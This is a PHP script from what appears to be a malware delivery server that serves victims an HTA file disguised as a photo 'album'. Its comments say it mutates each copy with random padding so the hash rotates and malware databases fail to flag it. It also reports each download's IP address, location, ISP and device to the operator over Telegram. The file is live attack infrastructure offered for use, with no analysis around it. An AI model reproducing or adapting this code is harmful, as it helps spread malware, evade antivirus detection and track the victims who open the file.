<?php
require __DIR__ . '/../lib.php';

// ============================================================
//  The actual download. Serves a per-download FRESH copy of the
//  source HTA directly (no zip wrapper). The hash is unique per
//  download: random whitespace/comment bytes are injected before
//  </body>, so the HTA's own SHA-256 differs every time
//  (malware DBs key off the file once executed — a static hash
//  gets flagged eventually; a rotating one does not.)
// ============================================================

$tok = gate_dl();

// ---- name for THIS download (fixed by the visit, not by this request) ----
$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }

// ---- read source HTA ----
$src = SOURCE_ZIP;
if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
$bytes = (string)@file_get_contents($src);
if ($bytes === '') { http_response_code(500); echo '500'; exit; }

// ---- mutate the HTA: inject an invisible random comment before </body>
//      so the served file's SHA-256 differs every time. ----
$pad = random_int(2, 8) . " \n";                              // random trailing whitespace
$cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . "-->\n";
$pos = strrpos($bytes, '</body>');
$bytes = ($pos !== false)
    ? substr($bytes, 0, $pos) . $pad . $cmt . substr($bytes, $pos)
    : $bytes . $pad . $cmt;

// ---- one Telegram alert per real served download (deduped by visit) ----
$key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g = geo(ip());
    $msg = "\x{1F4F8} Album Served \x{1F4F8}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . " (" . round(strlen($bytes) / 1048576, 2) . " MB)\n"
         . "\x{1F501} SHA256: " . substr(hash('sha256', $bytes), 0, 16) . "...\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}

// ---- serve ----
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $name . '"');
header('Expires: 0');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Content-Length: ' . strlen($bytes));
echo $bytes;
exit;
